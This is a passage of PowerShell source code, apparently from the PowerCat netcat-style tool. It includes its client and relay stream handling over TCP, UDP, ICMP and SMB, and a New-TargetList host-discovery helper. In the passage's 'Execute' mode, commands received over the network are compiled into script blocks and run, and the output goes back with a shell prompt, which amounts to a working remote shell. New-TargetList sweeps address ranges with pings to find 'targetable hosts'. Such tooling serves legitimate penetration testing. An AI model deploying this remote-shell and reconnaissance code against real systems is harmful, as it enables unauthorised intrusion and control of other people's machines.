            elseif ($Input.GetType() -eq [Byte[]]) { $BytesToSend = $Input }
            elseif ($Input.GetType() -eq [String]) { $BytesToSend = $EncodingType.GetBytes($Input) }
            else { Write-Warning 'Incompatible input type.' ; return }
        }

        elseif ($PSCmdlet.ParameterSetName -eq 'Relay') {
            
            Write-Verbose "Setting up relay stream..."

            $RelayConfig = $Relay.Split(':')

            if ($RelayConfig.Count -eq 2) { # Listener
                
                $RelayMode = $RelayConfig[0].ToLower()

                switch ($RelayMode) {
                   'icmp' { $RelayStream = New-IcmpStream -Listener $RelayConfig[1] ; continue }
                    'smb' { $RelayStream = New-SmbStream -Listener $RelayConfig[1] ; continue }
                    'tcp' { $RelayStream = New-TcpStream -Listener $RelayConfig[1] ; continue }
                    'udp' { $RelayStream = New-UdpStream -Listener $RelayConfig[1] ; continue }
                    default { Write-Warning 'Invalid relay mode specified.' ; return }
                }
            }
            elseif ($RelayConfig.Count -eq 3) { # Client
                
                $RelayMode = $RelayConfig[0].ToLower()
                $ServerIp = [Net.IPAddress]::Parse($RemoteIp)

                switch ($RelayMode) {
                   'icmp' { $RelayStream = New-IcmpStream $ServerIp $RelayConfig[2] ; continue }
                    'smb' { $RelayStream = New-SmbStream $RelayConfig[1] $RelayConfig[2] ; continue }
                    'tcp' { $RelayStream = New-TcpStream $ServerIp $RelayConfig[2] ; continue }
                    'udp' { $RelayStream = New-UdpStream $ServerIp $RelayConfig[2] ; continue }
                    default { Write-Warning 'Invalid relay mode specified.' ; return }
                }
            }
            else { Write-Error 'Invalid relay format.' -ErrorAction Stop }
        }
          
        elseif ($ParameterDictionary.ScriptBlock.Value) {
            
            Write-Verbose 'Executing scriptblock...'

            $ScriptBlock = $ParameterDictionary.ScriptBlock.Value
            
            $Error.Clear()
            
            $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke($ParameterDictionary.ArgumentList.Value) | Out-String))
            if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
            $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
            
            $ScriptBlock = $null
        }

        Write-Verbose "Setting up network stream..."

        $ServerIp = [Net.IPAddress]::Parse($RemoteIp)

        switch ($Mode) {
           'Icmp' { 
                try { $InitialBytes, $ClientStream = New-IcmpStream $ServerIp $ParameterDictionary.BindAddress.Value }
                catch { Write-Warning "Failed to open Icmp stream. $($_.Exception.Message)" ; return }
                continue 
            }
            'Smb' { 
                try { $ClientStream = New-SmbStream $RemoteIp $ParameterDictionary.PipeName.Value  }
                catch { Write-Warning "Failed to open Smb stream. $($_.Exception.Message)" ; return }
                continue 
            }
            'Tcp' { 
                try { $ClientStream = New-TcpStream $ServerIp $ParameterDictionary.Port.Value }
                catch { Write-Warning "Failed to open Tcp stream. $($_.Exception.Message)" ; return }
                continue 
            }
            'Udp' { 
                try { $InitialBytes, $ClientStream = New-UdpStream $ServerIp $ParameterDictionary.Port.Value }
                catch { Write-Warning "Failed to open Udp stream. $($_.Exception.Message)" ; return }
            }
        }
      
        if ($BytesToSend.Count) { Write-NetworkStream $Mode $ClientStream $BytesToSend }        
    }
    Process {     
    
        if ($Disconnect.IsPresent) { Write-Verbose 'Disconnect specified, exiting.' ; break }

        while ($true) {
            
            # Catch Esc / Read-Host
            if ([console]::KeyAvailable) {          
                $Key = [console]::ReadKey()
                if ($Key.Key -eq [Consolekey]::Escape) {
                    Write-Warning 'Caught escape sequence, stopping PowerCat.'
                    break
                }
                if ($PSCmdlet.ParameterSetName -eq 'Console') { 
                    $BytesToSend = $EncodingType.GetBytes($Key.KeyChar + (Read-Host) + "`n") 
                    Write-NetworkStream $Mode $ClientStream $BytesToSend
                }
            }

            # Get data from the network
            if ($ServerStream.InitialConnectionBytes) { $ReceivedBytes = $ServerStream.InitialConnectionBytes ; $ServerStream.InitialConnectionBytes = $null }
            elseif ($ServerStream.Socket.Connected) { if ($ServerStream.Read.IsCompleted) { $ReceivedBytes = Read-NetworkStream $Mode $ServerStream $ServerStream.Socket.Available } }
            elseif ($ServerStream.Pipe.IsConnected) { if ($ServerStream.Read.IsCompleted) { $ReceivedBytes = Read-NetworkStream $Mode $ServerStream } }
            else { Write-Warning 'Connection broken, exiting.' ; break }

            # Redirect received bytes
            if ($PSCmdlet.ParameterSetName -eq 'Execute') {
            
                $ScriptBlock = [ScriptBlock]::Create($EncodingType.GetString($ReceivedBytes))
            
                $Error.Clear()

                $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke() | Out-String))
                if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
                $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
            
                Write-NetworkStream $Mode $ClientStream $BytesToSend 
                $BytesToSend = $null
                $ScriptBlock = $null
                continue
            }
            elseif ($PSCmdlet.ParameterSetName -eq 'Relay') { Write-NetworkStream $RelayMode $RelayStream $ReceivedBytes ; continue }
            elseif ($PSCmdlet.ParameterSetName -eq 'OutFile') { 
                if ($OutputType -eq 'Bytes') { 
                    $FileStream = New-Object IO.FileStream -ArgumentList @($OutputFile, [IO.FileMode]::Append)
                    [void]$FileStream.Seek(0, [IO.SeekOrigin]::End) 
                    $FileStream.Write($ReceivedBytes, 0, $ReceivedBytes.Length) 
                    $FileStream.Flush() 
                    $FileStream.Dispose() 
                    continue
                }
                else { $EncodingType.GetString($ReceivedBytes) | Out-File -Append -FilePath $OutputFile ; continue }
            }
            else { # StdOut
                if ($OutputType -eq 'Bytes') { Write-Output $ReceivedBytes }
                else { Write-Host -NoNewline $EncodingType.GetString($ReceivedBytes).TrimEnd("`r") }
            }
        }
    }
    End {   

        Write-Verbose 'Attempting to close network stream.'
      
        try { Close-NetworkStream $Mode $ClientStream }
        catch { Write-Warning "Failed to close client stream. $($_.Exception.Message)" }

        if ($PSCmdlet.ParameterSetName -eq 'Relay') {
            try { Close-NetworkStream $RelayMode $RelayStream }
            catch { Write-Warning "Failed to close relay stream. $($_.Exception.Message)" }
        }
    }
}

function New-RuntimeParameter { 
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [Type]$Type,

        [Parameter(Position = 1, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [String]$Name,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [String[]]$Alias,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [Int]$Position,

        [Parameter()]
        [Switch]$Mandatory,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [String]$HelpMessage,
        
        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [String[]]$ValidateSet,
        
        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [Regex]$ValidatePattern,

        [Parameter()]
        [Switch]$ValueFromPipeline,
        
        [Parameter()]
        [Switch]$ValueFromPipelineByPropertyName,

        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [String]$ParameterSetName = '__AllParameterSets',

        [Parameter()]
        [System.Management.Automation.RuntimeDefinedParameterDictionary]$ParameterDictionary
    )      
    #create a new ParameterAttribute Object
    $Attribute = New-Object Management.Automation.ParameterAttribute
    $Attribute.ParameterSetName = $ParameterSetName

    if ($PSBoundParameters.Position) { $Attribute.Position = $Position }

    if ($Mandatory.IsPresent) { $Attribute.Mandatory = $true }
    else { $Attribute.Mandatory = $false }

    if ($PSBoundParameters.HelpMessage) { $Attribute.HelpMessage = $HelpMessage }
    
    if ($ValueFromPipeline.IsPresent) { $Attribute.ValueFromPipeline = $true }
    else { $Attribute.ValueFromPipeline = $false }

    if ($ValueFromPipelineByPropertyName.IsPresent) { $Attribute.ValueFromPipelineByPropertyName = $true }
    else { $Attribute.ValueFromPipelineByPropertyName = $false }
 
    #create an attributecollection object for the attribute we just created.
    $AttributeCollection = New-Object Collections.ObjectModel.Collection[Attribute]
 
    if ($PSBoundParameters.ValidateSet) {
        $ParamOptions = New-Object Management.Automation.ValidateSetAttribute -ArgumentList $ValidateSet
        $AttributeCollection.Add($ParamOptions)
    }

    if ($PSBoundParameters.Alias) {
        $ParamAlias = New-Object Management.Automation.AliasAttribute -ArgumentList $Alias
        $AttributeCollection.Add($ParamAlias)
    }

    if ($PSBoundParameters.ValidatePattern) {
        $ParamPattern = New-Object Management.Automation.ValidatePatternAttribute -ArgumentList $ValidatePattern
        $AttributeCollection.Add($ParamPattern)
    }

    #add our custom attribute
    $AttributeCollection.Add($Attribute)

    $Parameter = New-Object Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, $Type, $AttributeCollection)

    if($PSBoundParameters.ParameterDictionary) { $ParameterDictionary.Add($Name, $Parameter) }
    else {
        $Dictionary = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        $Dictionary.Add($Name, $Parameter)
        Write-Output $Dictionary
    }
}

function Test-Port { 
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [Int]$Number,

        [Parameter(Position = 1)]
        [ValidateSet('Tcp','Udp')]
        [String]$Transport
    )      
    
    $IPGlobalProperties = [Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()

    if ($Transport -eq 'Tcp') {       
        foreach ($Connection in $IPGlobalProperties.GetActiveTcpConnections()) {
            if ($Connection.LocalEndPoint.Port -eq $Number) { 
                Write-Warning "Port $Number`:Tcp is already in use."
                return $false
            }
        }
        foreach ($Listener in $IPGlobalProperties.GetActiveTcpListeners()) {
            if ($Listener.Port -eq $Number) { 
                Write-Warning "Port $Number`:Tcp is already in use."
                return $false
            }
        }
    }
    elseif ($Transport -eq 'Udp') {       
        foreach ($Listener in $IPGlobalProperties.GetActiveUdpListeners()) {
            if ($Listener.Port -eq $Number) { 
                Write-Warning "Port $Number`:Udp is already in use."
                return $false
            }
        }
    }
    else { # check both Tcp & Udp
        foreach ($Connection in $IPGlobalProperties.GetActiveTcpConnections()) {
            if ($Connection.LocalEndPoint.Port -eq $Number) { 
                Write-Warning "Port $Number`:Tcp is already in use."
                return $false
            }
        }
        foreach ($Listener in $IPGlobalProperties.GetActiveTcpListeners()) {
            if ($Listener.Port -eq $Number) { 
                Write-Warning "Port $Number`:Tcp is already in use."
                return $false
            }
        }
        foreach ($Listener in $IPGlobalProperties.GetActiveUdpListeners()) {
            if ($Listener.Port -eq $Number) { 
                Write-Warning "Port $Number`:Udp is already in use."
                return $false
            }
        }
    }
    return $true
}

function Send-PingAsync {
[CmdLetBinding()]
     Param(
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [ValidateNotNullOrEmpty()]
        [String[]]$ComputerName,
        
        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [Int32]$Timeout = 250
    ) #End Param

    $Pings = New-Object Collections.Arraylist

    foreach ($Computer in $ComputerName) {
        [void]$Pings.Add((New-Object Net.NetworkInformation.Ping).SendPingAsync($Computer, $Timeout))
    }
    Write-Verbose "Waiting for ping tasks to complete..."
    [Threading.Tasks.Task]::WaitAll($Pings)

    foreach ($Ping in $Pings) { Write-Output $Ping.Result }
}

function New-TargetList {
<#
.SYNOPSIS
Dynamically builds a list of targetable hosts.

Version: 0.1
Author : Jesse Davis (@secabstraction)
License: BSD 3-Clause

.DESCRIPTION


.PARAMETER NetAddress
Specify an IPv4 network address, requires the NetMask parameter.

.PARAMETER NetMask 
Specify the network mask as an IPv4 address, used with NetAddress parameter.

.PARAMETER StartAddress
Specify an IPv4 address at the beginning of a range of addresses.

.PARAMETER EndAddress
Specify an IPv4 address at the end of a range of addresses.

.PARAMETER Cidr
Specify a single IPv4 network or a list of networks in CIDR notation.

.PARAMETER NoStrikeList
Specify the path to a list of IPv4 addresses that should never be touched.

.PARAMETER ResolveIp
Attemtps to Resolve IPv4 addresses to hostnames using DNS lookups.

.PARAMETER Randomize
Randomizes the list of targets returned.

.EXAMPLE
The following example builds a list of IP addresses from 10.10.10.1-10.10.10.254 and 10.10.20.1-10.10.20.254

PS C:\> New-TargetList -Cidr 10.10.10.0/24,10.10.20.0/24

.EXAMPLE
The following example builds a list of IP addresses from 10.10.10.1-10.10.10.254

PS C:\> New-TargetList -StartAddress 10.10.10.1 -EndAddress 10.10.10.254

.EXAMPLE
The following example builds a list of IP addresses from 10.10.10.1-10.10.10.254

PS C:\> New-TargetList -NetAddress 10.10.10.0 -NetMask 255.255.255.0

.EXAMPLE
The following example builds a list of IP addresses from 10.10.10.1-10.10.10.254 and randomizes the output.

PS C:\> New-TargetList -NetAddress 10.10.10.0 -NetMask 255.255.255.0 -Randomize

.EXAMPLE
The following example builds a list of IP addresses from 10.10.10.1-10.10.10.254 and returns a list of IP addresses that repsond to ping requests.

PS C:\> New-TargetList -Cidr 10.10.10.0/24 -FindAlives

.EXAMPLE
The following example builds a list of IP addresses from 10.10.10.1-10.10.10.254 and returns a list of hostnames that repsond to ping requests and have DNS entries.

PS C:\> New-TargetList -Cidr 10.10.10.0/24 -FindAlives -ResolveIp

.EXAMPLE
The following example builds a list of IP addresses from 10.10.10.1-10.10.10.254 and returns a list of hostnames that repsond to ping requests, have DNS entries, and are not included in a no-strike list.

PS C:\> New-TargetList -Cidr 10.10.10.0/24 -FindAlives -ResolveIp -NoStrikeList C:\pathto\NoStrikeList.txt

.NOTES

#>
    Param(
        [Parameter(ParameterSetName = "NetMask", Position = 0, Mandatory = $true)]
        [String]$NetAddress,
        
        [Parameter(ParameterSetName = "NetMask", Position = 1, Mandatory = $true)]
        [String]$NetMask,

        [Parameter(ParameterSetName = "IpRange", Position = 0, Mandatory = $true)]
        [String]$StartAddress,

        [Parameter(ParameterSetName = "IpRange", Position = 1, Mandatory = $true)]
        [String]$EndAddress,

        [Parameter(ParameterSetName = "Cidr", Position = 0, Mandatory = $true)]
        [String[]]$Cidr,

        [Parameter()]
        [String]$NoStrikeList,

        [Parameter()]
        [Switch]$FindAlives,

        [Parameter()]
        [Switch]$ResolveIp,

        [Parameter()]
        [Switch]$Randomize
    ) #End Param

    #region HELPERS
    function local:Convert-Ipv4ToInt64 {  
        param (
            [Parameter()]
            [String]$Ipv4Address
        )  
            $Octets = $Ipv4Address.split('.')  
            Write-Output ([Int64](  [Int64]$Octets[0] * 16777216 + [Int64]$Octets[1] * 65536 + [Int64]$Octets[2] * 256 + [Int64]$Octets[3]  ))  
    }    
    function local:Convert-Int64ToIpv4 {  
        param (
            [Parameter()]
            [Int64]$Int64
        )   
            Write-Output (([Math]::Truncate($Int64 / 16777216)).ToString() + "." + ([Math]::Truncate(($Int64 % 16777216) / 65536)).ToString() + "." + ([Math]::Truncate(($Int64 % 65536) / 256)).ToString() + "." + ([Math]::Truncate($Int64 % 256)).ToString()) 
    } 
    #endregion HELPERS

    #regex for input validation
    $IPv4 = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
    $IPv4_CIDR = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\/([0-9]|[1-2][0-9]|3[0-2]))$"   
                
    $IpList = New-Object Collections.Arraylist

    #Build IP Address list
    if ($PSCmdlet.ParameterSetName -eq "Cidr") {
        Write-Verbose "Building target list..."
        
        foreach ($Address in $Cidr) {
            if ($Address -notmatch $IPv4_CIDR) {
                Write-Warning "$Address is not a valid CIDR address!"
                continue
            }

            $Split = $Address.Split('/')
            $Net = [Net.IPAddress]::Parse($Split[0])
            $Mask = [Net.IPAddress]::Parse((Convert-Int64ToIpv4 -Int64 ([Convert]::ToInt64(("1" * $Split[1] + "0" * (32 - $Split[1])), 2))))
            
            $Network = New-Object Net.IPAddress ($Mask.Address -band $Net.Address)
            $Broadcast = New-Object Net.IPAddress (([Net.IPAddress]::Parse("255.255.255.255").Address -bxor $Mask.Address -bor $Network.Address))

            $Start = Convert-Ipv4ToInt64 -Ipv4Address $Network.IPAddressToString
            $End = Convert-Ipv4ToInt64 -Ipv4Address $Broadcast.IPAddressToString

            for ($i = $Start + 1; $i -lt $End; $i++) { [void]$IpList.Add((Convert-Int64ToIpv4 -Int64 $i)) }
        } 
    }
    if ($PSCmdlet.ParameterSetName -eq "NetMask") {       
        Write-Verbose "Building target list..."

        if ($NetAddress -notmatch $IPv4) { 
            Write-Warning "$NetAddress is not a valid IPv4 address!"
            break
        }
        if ($NetMask -notmatch $IPv4) { 
            Write-Warning "$NetMask is not a valid network mask!"
            break
        }

        $Net = [Net.IPAddress]::Parse($NetAddress)
        $Mask = [Net.IPAddress]::Parse($NetMask)

        $Network = New-Object Net.IPAddress ($Mask.Address -band $Net.Address)
        $Broadcast = New-Object Net.IPAddress (([Net.IPAddress]::Parse("255.255.255.255").Address -bxor $Mask.Address -bor $Network.Address))

        $Start = Convert-Ipv4ToInt64 -Ipv4Address $Network.IPAddressToString
        $End = Convert-Ipv4ToInt64 -Ipv4Address $Broadcast.IPAddressToString

        for ($i = $Start + 1; $i -lt $End; $i++) { [void]$IpList.Add((Convert-Int64ToIpv4 -Int64 $i)) }
    }
    if ($PSCmdlet.ParameterSetName -eq "IpRange") {
        Write-Verbose "Building target list..."

        if ($StartAddress -notmatch $IPv4) { 
            Write-Warning "$StartAddress is not a valid IPv4 address!"
            break
        }
        if ($EndAddress -notmatch $IPv4) { 
            Write-Warning "$EndAddress is not a valid network mask!"
            break
        }

        $Start = Convert-Ipv4ToInt64 -Ipv4Address $StartAddress
        $End = Convert-Ipv4ToInt64 -Ipv4Address $EndAddress

        for ($i = $Start ; $i -le $End; $i++) { [void]$IpList.Add((Convert-Int64ToIpv4 -Int64 $i)) }
    }

    ######### Remove Assets #########
    if ($PSBoundParameters['NoStrikeList']) {
        $ExclusionList = New-Object Collections.Arraylist

        $NoStrike = Get-Content $NoStrikeList | Where-Object {$_ -notmatch "^#"}
        foreach ($Entry in $NoStrike) {
            if ($Entry -match $IPv4) { $ExclusionList.Add($Entry) }
            else { 
                try { $ResolvedIp = ([Net.DNS]::GetHostByName("$Entry")).AddressList[0].IPAddressToString }
                catch { 
                    Write-Warning "$Entry is not a valid IPv4 address nor resolvable hostname. Check no strike list formatting." 
                    continue
                }
                [void]$ExclusionList.Add($ResolvedIp)
            }
        }       

        $ValidTargets = $IpList | Where-Object { $ExclusionList -notcontains $_ }
    }
    else { $ValidTargets = $IpList }

    ######### Randomize list #########
    if ($Randomize.IsPresent) {
        Write-Verbose "Randomizing target list..."
        $Random = New-Object Random
        $ValidTargets = ($ValidTargets.Count)..1 | ForEach-Object { $Random.Next(0, $ValidTargets.Count) | ForEach-Object { $ValidTargets[$_]; $ValidTargets.RemoveAt($_) } }
    }

    ########## Find Alives & Resolve Hostnames ###########
    if ($FindAlives.IsPresent -and $ResolveIp.IsPresent) {
        Write-Verbose "Pinging hosts..."

        $Pings = New-Object Collections.ArrayList
        $AliveTargets = New-Object Collections.ArrayList

        foreach ($Address in $ValidTargets) {
            [void]$Pings.Add((New-Object Net.NetworkInformation.Ping).SendPingAsync($Address, 250))
        }        
        [Threading.Tasks.Task]::WaitAll($Pings)

        foreach ($Ping in $Pings) {
            if ($Ping.Result.Status -eq [Net.NetworkInformation.IPStatus]::Success) {
                [void]$AliveTargets.Add($Ping.Result.Address.IPAddressToString)
            }
        }
        Write-Verbose "    $($AliveTargets.Count) hosts alive..."

        if ($AliveTargets.Count -lt 1) {
            Write-Warning "No alive hosts found. If hosts are responding to ping, check configuration."
            break
        }
        else {
            Write-Verbose "Resolving hostnames, this may take a while..."

            $ResolvedHosts = New-Object Collections.Arraylist
            $i = 1
            foreach ($Ip in $AliveTargets) {
                #Progress Bar
                Write-Progress -Activity "Resolving Hosts - *This may take a while*" -Status "Hosts Processed: $i of $($AliveTargets.Count)" -PercentComplete ($i / $AliveTargets.Count * 100)
        
                #Resolve the name of the host
                $CurrentEAP = $ErrorActionPreference
                $ErrorActionPreference = "SilentlyContinue"
                [void]$ResolvedHosts.Add(([Net.DNS]::GetHostByAddress($Ip)).HostName)
                $ErrorActionPreference = $CurrentEAP
                
                $i++
            }
            Write-Progress -Activity "Resolving Hosts" -Status "Done" -Completed
            Write-Output $ResolvedHosts
        }
    }
    
    ########## Only Find Alives ##############
    elseif ($FindAlives.IsPresent -and !$ResolveIp.IsPresent) {
        Write-Verbose "Finding alive hosts..."

        $Pings = New-Object Collections.ArrayList
        $AliveTargets = New-Object Collections.ArrayList

        foreach ($Address in $ValidTargets) {
            [void]$Pings.Add((New-Object Net.NetworkInformation.Ping).SendPingAsync($Address, 250))
        }
        
        [Threading.Tasks.Task]::WaitAll($Pings)

        foreach ($Ping in $Pings) {
            if ($Ping.Result.Status -eq [Net.NetworkInformation.IPStatus]::Success) {
                [void]$AliveTargets.Add($Ping.Result.Address.IPAddressToString)
            }
        }

        if ($AliveTargets.Count -lt 1) {
            Write-Warning "No alive hosts found. If hosts are responding to ping, check configuration."
            break
        }  
        else { 
            Write-Verbose "    $($AliveTargets.Count) alive and targetable hosts..."
            Write-Output $AliveTargets 
        }
    }

    ########## Only Resolve Hostnames ########
    elseif ($ResolveIp.IsPresent -and !$FindAlives.IsPresent) {
        Write-Verbose "Resolving hostnames, this may take a while..."

        $ResolvedHosts = New-Object Collections.Arraylist
        $i = 1
        foreach ($Ip in $ValidTargets) {
            #Progress Bar
            Write-Progress -Activity "Resolving Hosts - *This may take a while*" -Status "Hosts Processed: $i of $($ValidTargets.Count)" -PercentComplete ($i / $ValidTargets.Count * 100)
        
            #Resolve the name of the host
            $CurrentEAP = $ErrorActionPreference
            $ErrorActionPreference = "SilentlyContinue"
            [void]$ResolvedHosts.Add(([Net.DNS]::GetHostByAddress($Ip)).HostName)
            $ErrorActionPreference = $CurrentEAP
                
            $i++
        }
        Write-Progress -Activity "Resolving Hosts" -Status "Done" -Completed
        Write-Output $ResolvedHosts
    }
    
    ########## Don't find alives or resolve ########
    else { Write-Output $ValidTargets }
}